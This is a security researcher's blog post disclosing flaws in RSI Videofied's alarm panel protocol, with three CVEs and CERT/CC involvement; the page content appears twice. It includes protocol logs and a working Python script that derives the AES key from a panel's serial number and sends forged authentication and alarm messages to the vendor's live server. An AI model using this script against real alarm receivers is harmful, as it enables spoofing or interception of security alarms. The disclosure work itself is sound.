* [Contact](https://cybergibbons.com/contact/)
* [PGP key](https://cybergibbons.com/pgp-key/)

# Multiple serious vulnerabilities in RSI Videofied’s alarm protocol

Posted on [November 30, 2015](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/) by [cybergibbons](https://cybergibbons.com/author/cybergibbons/ "View all posts by cybergibbons")

[RSI Videofied](http://www.videofied.com/eu/uk/home/) are a French company that produce a series of alarm panels that are fairly unique in the market. They are designed to be battery powered and send videos from the detectors if the alarm is triggered. This is called video verification. They are frequently used on building sites and disused buildings.

They send data over either GPRS (mobile) or IP. Whilst reverse engineering as part of competitor analysis for a client, I found a large number of vulnerabilities in the protocol they use to communicate.

In summary, the protocol is so broken that it provides no security, allowing an attacker to easily spoof or intercept alarms.

As appears to be the norm in the physical security world, the vendor failed to respond over the course of 6 weeks, so this was taken to CERT/CC for disclosure. ~~They are due for disclosure 30 November 2015.~~ CERT/CC have [released their report.](http://www.kb.cert.org/vuls/id/792004)

The issues were found in their newest [W Panels](https://www.videofied.com/eu/uk/products/w_panel/) in mid-2015.

The following CVEs have been assigned:

* CWE-321: Use of Hard-coded Cryptographic Key – CVE-2015-8252
* CWE-311: Missing Encryption of Sensitive Data – CVE-2015-8253
* CWE-345: Insufficient Verification of Data Authenticity – CVE-2015-8254

RSI Videofied have stated to CERT/CC that this is fixed in version 3 of their protocol which is currently being rolled out.

## Weak authentication

When the panel initially communicates with the receiving server, there is an authentication handshake (R is received by panel, S is sent by panel)

```
R: IDENT,1000.
S: IDENT,EA00121513080139,2.
R: VERSION2,0.AUTH1,9301D4E13A1CDF51F873C790AFD602AF.
S: AUTH2,91A4E381AF21ECEB010FA0EE83021D48,D8717F423736A1F01510D25E919A3ED2.
R: AUTH3,8EE8E00CFEFEF83C76D34A6B7EC4BB23.
S: AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7.ALARM,
```

This looks like some kind of challenge/response. EA00121513080139 is the panel’s serial number. 1440 is the account number for that particular panel.

Brief entropy analysis of the long strings in AUTH1, AUTH2, and AUTH3 showed them to be random.

A Python script was created to mimic the panel.

It was noted that if the serial number was altered, the response was different:

```
R: IDENT,1000
S: IDENT,EA00121513080136,2
R: SETKEY,10680211105310035016110010318802
R: VERSION,2,0 AUTH1,D5689F494D81ECA07E72CC0F3459ED4E
```

It appears that the first time a particular server sees a serial number, it informs the panel of the key used for the challenge/response. If we then attempt to connect again, the key is not shown to us.

It was then seen that connecting the panel to a new server at a different alarm receiving centre delivered exactly the same key. This means that the key is deterministic. It also means that to obtain the key for any given panel, all we need to do is send the serial number to another Videofied server (of which there are many).

However, we can go further than this. Notice that the key delivered above has a lot of common numbers with the serial number. It appears that the key is just a mixed up serial number:

```
R: IDENT,1000
S: IDENT,0000000000000000,2
R: SETKEY,00000000000010000000000000010000 VERSION,2,0 A
R: AUTH1,6587DA1323597F4AC986936BAF20102B

R: IDENT,1000
S: IDENT,0000000000000020,2
R: SETKEY,00000000000210000000000000210000
R: VERSION,2,0 AUTH1,0A79588F06FEB594D153237230BA0D61

R: IDENT,1000
S: IDENT,0123456789ABCDEF,2
R: SETKEY,40FB05D68C7E10A97A4FD6C080E1BB05
R: VERSION,2,0 AUTH1,D4F98DF37EF53F52505599D833484658
```

This means that we can trivially determine the key used for authentication using the serial number that is sent in the plain immediately beforehand.

The challenge response protocol is as follows:

```
Server: Random server challenge
Panel:  AES(Random server challenge, key) | Random panel challenge
Server: AES(Random panel challenge, key)
```

Now that we have the key, it is very easy for us to spoof this.

```
import socket
from Crypto.Cipher import AES
from Crypto import Random

# 4i Security's server and port
rsi_server = 'rsi.videofied.com'
rsi_port = 888
# This is the valid alarm serial
serial = 'A3AAA3AAA2AAAAAA'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rsi_server, rsi_port))

# Open a connection to the server should see
# IDENT,1000
print 'R:',s.recv(1024)

# This is the valid serial number from the board
msg = 'IDENT,' + serial + ',2\x1a'
print 'S:', msg
s.send(msg)

# Should receive
# VERSION,2,0
print 'R:', s.recv(1024)

# AUTH1,<16 byte challege>
auth1 = s.recv(1024)
print 'R:', auth1

# Split out challenge
challenge = auth1.split(',')[-1][:-1]
print 'Challenge:', challenge

# The key is just a jumbled up serial.
# This means the key is entirely deterministic and can be guessed from one sniffed packet.
key = serial[4] + '0' + serial[15] + serial[11] + '0' + serial[5] + serial[13] + serial[6] + serial[8] + serial[12] + serial[7] + serial[14] + '1' + '0' \
    + serial[10] + serial[9] + serial[7] + serial[10] + serial [4] + serial[15] + serial[13] + serial[6] + serial[12] + '0' + serial[8] + '0' + serial[14] + \
    '1' + serial[11] + serial[11] + '0' + serial[5]

cipher = AES.new(key.decode('hex'))

# Encrypt in EBC mode
response = cipher.encrypt(challenge.decode('hex')).encode('hex').upper()

print 'Response:', response

# Generate our own random challange
challenge = Random.new().read(16).encode('hex').upper()

# Send back response in form:
# AUTH2,<16 byte response>,<16 byte challenge>
msg = 'AUTH2,' + response + ',' + challenge + '\x1a'

print 'S:', msg
s.send(msg)

# Calculate the expected response
print 'Expected Response', cipher.encrypt(challenge.decode('hex')).encode('hex').upper()

# This should be the encrypted response from the server
print 'R:', s.recv(1024)

# Send capture status message
msg = 'AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7\x1aALARM,1932\x1a'
print 'S:', msg
s.send(msg)

print s.recv(1024)
```

Clearly this is not good.

## Authentication decoupled from identity

The above authentication ensures that a given panel with a serial number knows the key. Even if this key was secret and non-deterministic, it is entirely decoupled from the identity of the account. The account is the piece of information identifying the panel to the alarm receiving centre.

Notice that in the above authentication, the account number 1440 is not encrypted or linked to the panel serial:

```
R: IDENT,1000.
S: IDENT,EA00121513080139,2.
R: VERSION2,0.AUTH1,9301D4E13A1CDF51F873C790AFD602AF.
S: AUTH2,91A4E381AF21ECEB010FA0EE83021D48,D8717F423736A1F01510D25E919A3ED2.
R: AUTH3,8EE8E00CFEFEF83C76D34A6B7EC4BB23.
S: AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7.ALARM,
```

It turns out that we can simply re-program the panel to use site 1441, and it will report into the alarm receiving centre as account 1441. There is no tie to the serial number, and no authentication of the account number.

## Other basic crypto failings

Beyond the authentication being totally broken, the protocol suffers from further basic issues:

* Nothing is encrypted – anyone can view the content of the messages, including the videos.
* There is no integrity protection such as a message authentication code or even a checksum, meaning that it is easy for messages to be altered deliberately or by accident.
* There are no sequence numbers, which means that messages can be replayed and there is no end-to-end acknowledgement of alarm reception

## Conclusion

The RSI Videofied system has a level of security that is worthless. It looks like they tried something and used a common algorithm – AES – but messed it up so badly that they may as well have stuck with plaintext.

### Share this:

* [Twitter](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=custom-1371585913 "Click to share on Twitter")
* [Facebook](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=facebook "Click to share on Facebook")
* [Reddit](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=reddit "Click to share on Reddit")

This entry was posted in [Alarms](https://cybergibbons.com/category/alarms-2/), [Security](https://cybergibbons.com/category/security-2/). Bookmark the [permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/ "Permalink to Multiple serious vulnerabilities in RSI Videofied’s alarm protocol").

## 11 thoughts on “Multiple serious vulnerabilities in RSI Videofied’s alarm protocol”

1. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428103)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428103#respond)
   #### [RSI Videofied Security Alarm Protocol Flawed, Attackers Can Intercept Alarms | Wolf Halton, Open-Source Security](http://wolfhalton.info/2015/11/30/rsi-videofied-security-alarm-protocol-flawed-attackers-can-intercept-alarms/)

   November 30, 2015 at 5:36pm

   […] Videofied is a French manufacturer of alarm systems. According to research carried out by Cybergibbons Limited, one of their recently launched alarm system lines ha… (read more) Source: […]
3. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428108)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428108#respond)
   #### [VU#792004: RSI Video Technologies Videofied security system Frontel software uses an insecure custom protocol - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/vu792004-rsi-video-technologies-videofied-security-system-frontel-software-uses-an-insecure-custom-protocol/)

   November 30, 2015 at 5:58pm

   […] For more information, please see the researcher’s blog post. […]
5. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428134)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428134#respond)
   #### [VU#792004: RSI Video Technologies Videofied security system Frontel software uses an insecure custom protocol - cPanel Knowledge](http://www.cpanelknowledge.com/vu792004-rsi-video-technologies-videofied-security-system-frontel-software-uses-an-insecure-custom-protocol/)

   November 30, 2015 at 9:53pm

   […] For more information, please see the researcher’s blog post. […]
7. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428198)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428198#respond)
   #### [Videofied Alarm System Flaws Allow Hackers to Intercept Data | Cyber Security News](https://cyber-security.news/videofied-alarm-system-flaws-allow-hackers-to-intercept-data)

   December 1, 2015 at 11:14am

   […] with UK-based security consultancy Cybergibbons analyzed W Panel, one of the Videofied control panels designed for use in residential, small business and […]
9. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428625)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428625#respond)
   #### [Videofied Alarm System Flaws, Allow Hackers to Intercept Data | »XoZZeN«](http://www.xozzen.com/blog/videofied-alarm-system-flaws-allow-hackers-to-intercept-data/)

   December 4, 2015 at 1:53pm

   […] and videos when an alarm is triggered. Researchers with UK-based security consultancy Cybergibbons analyzed W Panel, one of the Videofied control panels designed for use in residential, small business and […]
11. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432107)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432107#respond)
    #### [SB15-363: Vulnerability Summary for the Week of December 21, 2015 « CyberSafe NV](http://cybersafenv.org/sb15-363-vulnerability-summary-for-the-week-of-december-21-2015/)

    December 29, 2015 at 5:38pm

    […] CVE-2015-8252CERT-VNMISC […]
13. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432126)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432126#respond)
    #### [SB15-363: Vulnerability Summary for the Week of December 21, 2015 - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/sb15-363-vulnerability-summary-for-the-week-of-december-21-2015/)

    December 29, 2015 at 10:01pm

    […] CVE-2015-8252CERT-VNMISC […]
15. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432865)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432865#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 « CyberSafe NV](http://cybersafenv.org/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 4, 2016 at 3:58pm

    […] CVE-2015-8252CERT-VNMISC […]
17. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432875)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432875#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 4, 2016 at 4:53pm

    […] CVE-2015-8252CERT-VNMISC […]
19. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432924)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432924#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 | 007 Software](http://007software.net/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 5, 2016 at 2:51am

    […] CVE-2015-8252CERT-VNMISC […]
21. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-433412)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=433412#respond)
    #### [SB15-363 Vulnerability Summary for the Week of December 21st 2015 | ECI Networks](http://ecinetworks.com/sb15-363-vulnerability-summary-for-the-week-of-december-21st-2015/)

    January 8, 2016 at 6:07pm

    […] CVE-2015-8252 CERT-VN MISC […]

### Leave a Reply [Cancel reply](/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#respond)

Your email will not be published. Name and Email fields are required.

CommentName
Email
Website

 Notify me of follow-up comments by email.

 Notify me of new posts by email.

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed](https://akismet.com/privacy/).

# Categories

* [Alarms](https://cybergibbons.com/category/alarms-2/) (48)
  + [Alarm technologies](https://cybergibbons.com/category/alarms-2/alarm-technologies/) (5)
  + [Friedland Response reverse engineering](https://cybergibbons.com/category/alarms-2/friedland-response-reverse-engineering/) (8)
  + [Signalling devices](https://cybergibbons.com/category/alarms-2/signalling-devices/) (19)
* [Arduino](https://cybergibbons.com/category/arduino/) (9)
* [Cycling](https://cybergibbons.com/category/cycling/) (1)
* [Electronics](https://cybergibbons.com/category/electronics/) (5)
* [General tips](https://cybergibbons.com/category/general-tips/) (1)
* [Hardware Hacking](https://cybergibbons.com/category/hardware-hacking/) (10)
* [Heat pump monitor](https://cybergibbons.com/category/heat-pump-monitor/) (3)
* [Linux](https://cybergibbons.com/category/linux/) (1)
* [Lockpicking](https://cybergibbons.com/category/lockpicking-2/) (2)
* [Opinion](https://cybergibbons.com/category/opinion/) (3)
* [Quadcopter](https://cybergibbons.com/category/quadcopter/) (2)
* [Reverse Engineering](https://cybergibbons.com/category/reverse-engineering-2/) (17)
* [Reviews](https://cybergibbons.com/category/reviews/) (8)
  + [StickNFind](https://cybergibbons.com/category/reviews/sticknfind/) (8)
* [Security](https://cybergibbons.com/category/security-2/) (82)
  + [Bitfi](https://cybergibbons.com/category/security-2/bitfi/) (4)
  + [Burp Suite](https://cybergibbons.com/category/security-2/burp-suite/) (1)
  + [Nebula walkthrough](https://cybergibbons.com/category/security-2/nebula-walkthrough/) (11)
  + [Shodan Searches](https://cybergibbons.com/category/security-2/shodan-searches/) (8)
* [Uncategorized](https://cybergibbons.com/category/uncategorized/) (52)
# Tweets!

[My Tweets](https://twitter.com/cybergibbons)

* [RSS - Posts](https://cybergibbons.com/feed/ "Subscribe to posts")
* [RSS - Comments](https://cybergibbons.com/comments/feed/ "Subscribe to comments")

Powered by [WordPress](http://wordpress.org/). [Debut](https://github.com/kwight/debut/) theme by kwight.



=== Content from cybergibbons.com_f222d129_20250126_121438.html ===

# Menu

[Skip to content](#content)
Menu

* [Home](https://cybergibbons.com/)
* [About](https://cybergibbons.com/about-2/)
* [Contact](https://cybergibbons.com/contact/)
* [PGP key](https://cybergibbons.com/pgp-key/)

# [Cybergibbons](https://cybergibbons.com/)

## Reverse engineer, hardware hacker, security analyst, lock picker, heist planner. Definitely not involved in the Hatton Garden job.

Search

# Menu

[Skip to content](#content)

* [Home](https://cybergibbons.com/)
* [About](https://cybergibbons.com/about-2/)
* [Contact](https://cybergibbons.com/contact/)
* [PGP key](https://cybergibbons.com/pgp-key/)

# Multiple serious vulnerabilities in RSI Videofied’s alarm protocol

Posted on [November 30, 2015](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/) by [cybergibbons](https://cybergibbons.com/author/cybergibbons/ "View all posts by cybergibbons")

[RSI Videofied](http://www.videofied.com/eu/uk/home/) are a French company that produce a series of alarm panels that are fairly unique in the market. They are designed to be battery powered and send videos from the detectors if the alarm is triggered. This is called video verification. They are frequently used on building sites and disused buildings.

They send data over either GPRS (mobile) or IP. Whilst reverse engineering as part of competitor analysis for a client, I found a large number of vulnerabilities in the protocol they use to communicate.

In summary, the protocol is so broken that it provides no security, allowing an attacker to easily spoof or intercept alarms.

As appears to be the norm in the physical security world, the vendor failed to respond over the course of 6 weeks, so this was taken to CERT/CC for disclosure. ~~They are due for disclosure 30 November 2015.~~ CERT/CC have [released their report.](http://www.kb.cert.org/vuls/id/792004)

The issues were found in their newest [W Panels](https://www.videofied.com/eu/uk/products/w_panel/) in mid-2015.

The following CVEs have been assigned:

* CWE-321: Use of Hard-coded Cryptographic Key – CVE-2015-8252
* CWE-311: Missing Encryption of Sensitive Data – CVE-2015-8253
* CWE-345: Insufficient Verification of Data Authenticity – CVE-2015-8254

RSI Videofied have stated to CERT/CC that this is fixed in version 3 of their protocol which is currently being rolled out.

## Weak authentication

When the panel initially communicates with the receiving server, there is an authentication handshake (R is received by panel, S is sent by panel)

```
R: IDENT,1000.
S: IDENT,EA00121513080139,2.
R: VERSION2,0.AUTH1,9301D4E13A1CDF51F873C790AFD602AF.
S: AUTH2,91A4E381AF21ECEB010FA0EE83021D48,D8717F423736A1F01510D25E919A3ED2.
R: AUTH3,8EE8E00CFEFEF83C76D34A6B7EC4BB23.
S: AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7.ALARM,
```

This looks like some kind of challenge/response. EA00121513080139 is the panel’s serial number. 1440 is the account number for that particular panel.

Brief entropy analysis of the long strings in AUTH1, AUTH2, and AUTH3 showed them to be random.

A Python script was created to mimic the panel.

It was noted that if the serial number was altered, the response was different:

```
R: IDENT,1000
S: IDENT,EA00121513080136,2
R: SETKEY,10680211105310035016110010318802
R: VERSION,2,0 AUTH1,D5689F494D81ECA07E72CC0F3459ED4E
```

It appears that the first time a particular server sees a serial number, it informs the panel of the key used for the challenge/response. If we then attempt to connect again, the key is not shown to us.

It was then seen that connecting the panel to a new server at a different alarm receiving centre delivered exactly the same key. This means that the key is deterministic. It also means that to obtain the key for any given panel, all we need to do is send the serial number to another Videofied server (of which there are many).

However, we can go further than this. Notice that the key delivered above has a lot of common numbers with the serial number. It appears that the key is just a mixed up serial number:

```
R: IDENT,1000
S: IDENT,0000000000000000,2
R: SETKEY,00000000000010000000000000010000 VERSION,2,0 A
R: AUTH1,6587DA1323597F4AC986936BAF20102B

R: IDENT,1000
S: IDENT,0000000000000020,2
R: SETKEY,00000000000210000000000000210000
R: VERSION,2,0 AUTH1,0A79588F06FEB594D153237230BA0D61

R: IDENT,1000
S: IDENT,0123456789ABCDEF,2
R: SETKEY,40FB05D68C7E10A97A4FD6C080E1BB05
R: VERSION,2,0 AUTH1,D4F98DF37EF53F52505599D833484658
```

This means that we can trivially determine the key used for authentication using the serial number that is sent in the plain immediately beforehand.

The challenge response protocol is as follows:

```
Server: Random server challenge
Panel:  AES(Random server challenge, key) | Random panel challenge
Server: AES(Random panel challenge, key)
```

Now that we have the key, it is very easy for us to spoof this.

```
import socket
from Crypto.Cipher import AES
from Crypto import Random

# 4i Security's server and port
rsi_server = 'rsi.videofied.com'
rsi_port = 888
# This is the valid alarm serial
serial = 'A3AAA3AAA2AAAAAA'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rsi_server, rsi_port))

# Open a connection to the server should see
# IDENT,1000
print 'R:',s.recv(1024)

# This is the valid serial number from the board
msg = 'IDENT,' + serial + ',2\x1a'
print 'S:', msg
s.send(msg)

# Should receive
# VERSION,2,0
print 'R:', s.recv(1024)

# AUTH1,<16 byte challege>
auth1 = s.recv(1024)
print 'R:', auth1

# Split out challenge
challenge = auth1.split(',')[-1][:-1]
print 'Challenge:', challenge

# The key is just a jumbled up serial.
# This means the key is entirely deterministic and can be guessed from one sniffed packet.
key = serial[4] + '0' + serial[15] + serial[11] + '0' + serial[5] + serial[13] + serial[6] + serial[8] + serial[12] + serial[7] + serial[14] + '1' + '0' \
    + serial[10] + serial[9] + serial[7] + serial[10] + serial [4] + serial[15] + serial[13] + serial[6] + serial[12] + '0' + serial[8] + '0' + serial[14] + \
    '1' + serial[11] + serial[11] + '0' + serial[5]

cipher = AES.new(key.decode('hex'))

# Encrypt in EBC mode
response = cipher.encrypt(challenge.decode('hex')).encode('hex').upper()

print 'Response:', response

# Generate our own random challange
challenge = Random.new().read(16).encode('hex').upper()

# Send back response in form:
# AUTH2,<16 byte response>,<16 byte challenge>
msg = 'AUTH2,' + response + ',' + challenge + '\x1a'

print 'S:', msg
s.send(msg)

# Calculate the expected response
print 'Expected Response', cipher.encrypt(challenge.decode('hex')).encode('hex').upper()

# This should be the encrypted response from the server
print 'R:', s.recv(1024)

# Send capture status message
msg = 'AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7\x1aALARM,1932\x1a'
print 'S:', msg
s.send(msg)

print s.recv(1024)
```

Clearly this is not good.

## Authentication decoupled from identity

The above authentication ensures that a given panel with a serial number knows the key. Even if this key was secret and non-deterministic, it is entirely decoupled from the identity of the account. The account is the piece of information identifying the panel to the alarm receiving centre.

Notice that in the above authentication, the account number 1440 is not encrypted or linked to the panel serial:

```
R: IDENT,1000.
S: IDENT,EA00121513080139,2.
R: VERSION2,0.AUTH1,9301D4E13A1CDF51F873C790AFD602AF.
S: AUTH2,91A4E381AF21ECEB010FA0EE83021D48,D8717F423736A1F01510D25E919A3ED2.
R: AUTH3,8EE8E00CFEFEF83C76D34A6B7EC4BB23.
S: AUTH_SUCCESS,1440,1,20150729232041,5,2,E2612123110,0,XLP052300,0,27F7.ALARM,
```

It turns out that we can simply re-program the panel to use site 1441, and it will report into the alarm receiving centre as account 1441. There is no tie to the serial number, and no authentication of the account number.

## Other basic crypto failings

Beyond the authentication being totally broken, the protocol suffers from further basic issues:

* Nothing is encrypted – anyone can view the content of the messages, including the videos.
* There is no integrity protection such as a message authentication code or even a checksum, meaning that it is easy for messages to be altered deliberately or by accident.
* There are no sequence numbers, which means that messages can be replayed and there is no end-to-end acknowledgement of alarm reception

## Conclusion

The RSI Videofied system has a level of security that is worthless. It looks like they tried something and used a common algorithm – AES – but messed it up so badly that they may as well have stuck with plaintext.

### Share this:

* [Twitter](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=custom-1371585913 "Click to share on Twitter")
* [Facebook](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=facebook "Click to share on Facebook")
* [Reddit](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?share=reddit "Click to share on Reddit")

This entry was posted in [Alarms](https://cybergibbons.com/category/alarms-2/), [Security](https://cybergibbons.com/category/security-2/). Bookmark the [permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/ "Permalink to Multiple serious vulnerabilities in RSI Videofied’s alarm protocol").

## 11 thoughts on “Multiple serious vulnerabilities in RSI Videofied’s alarm protocol”

1. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428103)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428103#respond)
   #### [RSI Videofied Security Alarm Protocol Flawed, Attackers Can Intercept Alarms | Wolf Halton, Open-Source Security](http://wolfhalton.info/2015/11/30/rsi-videofied-security-alarm-protocol-flawed-attackers-can-intercept-alarms/)

   November 30, 2015 at 5:36pm

   […] Videofied is a French manufacturer of alarm systems. According to research carried out by Cybergibbons Limited, one of their recently launched alarm system lines ha… (read more) Source: […]
3. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428108)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428108#respond)
   #### [VU#792004: RSI Video Technologies Videofied security system Frontel software uses an insecure custom protocol - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/vu792004-rsi-video-technologies-videofied-security-system-frontel-software-uses-an-insecure-custom-protocol/)

   November 30, 2015 at 5:58pm

   […] For more information, please see the researcher’s blog post. […]
5. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428134)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428134#respond)
   #### [VU#792004: RSI Video Technologies Videofied security system Frontel software uses an insecure custom protocol - cPanel Knowledge](http://www.cpanelknowledge.com/vu792004-rsi-video-technologies-videofied-security-system-frontel-software-uses-an-insecure-custom-protocol/)

   November 30, 2015 at 9:53pm

   […] For more information, please see the researcher’s blog post. […]
7. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428198)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428198#respond)
   #### [Videofied Alarm System Flaws Allow Hackers to Intercept Data | Cyber Security News](https://cyber-security.news/videofied-alarm-system-flaws-allow-hackers-to-intercept-data)

   December 1, 2015 at 11:14am

   […] with UK-based security consultancy Cybergibbons analyzed W Panel, one of the Videofied control panels designed for use in residential, small business and […]
9. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-428625)
    ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=428625#respond)
   #### [Videofied Alarm System Flaws, Allow Hackers to Intercept Data | »XoZZeN«](http://www.xozzen.com/blog/videofied-alarm-system-flaws-allow-hackers-to-intercept-data/)

   December 4, 2015 at 1:53pm

   […] and videos when an alarm is triggered. Researchers with UK-based security consultancy Cybergibbons analyzed W Panel, one of the Videofied control panels designed for use in residential, small business and […]
11. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432107)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432107#respond)
    #### [SB15-363: Vulnerability Summary for the Week of December 21, 2015 « CyberSafe NV](http://cybersafenv.org/sb15-363-vulnerability-summary-for-the-week-of-december-21-2015/)

    December 29, 2015 at 5:38pm

    […] CVE-2015-8252CERT-VNMISC […]
13. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432126)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432126#respond)
    #### [SB15-363: Vulnerability Summary for the Week of December 21, 2015 - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/sb15-363-vulnerability-summary-for-the-week-of-december-21-2015/)

    December 29, 2015 at 10:01pm

    […] CVE-2015-8252CERT-VNMISC […]
15. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432865)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432865#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 « CyberSafe NV](http://cybersafenv.org/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 4, 2016 at 3:58pm

    […] CVE-2015-8252CERT-VNMISC […]
17. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432875)
     ⋅ [Reply](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/?replytocom=432875#respond)
    #### [SB16-004: Vulnerability Summary for the Week of December 28, 2015 - Varanoid.com](http://www.varanoid.com/research-alerts/us-cert/sb16-004-vulnerability-summary-for-the-week-of-december-28-2015/)

    January 4, 2016 at 4:53pm

    […] CVE-2015-8252CERT-VNMISC […]
19. [Permalink](https://cybergibbons.com/alarms-2/multiple-serious-vulnerabilities-in-rsi-videofieds-alarm-protocol/#comment-432924)
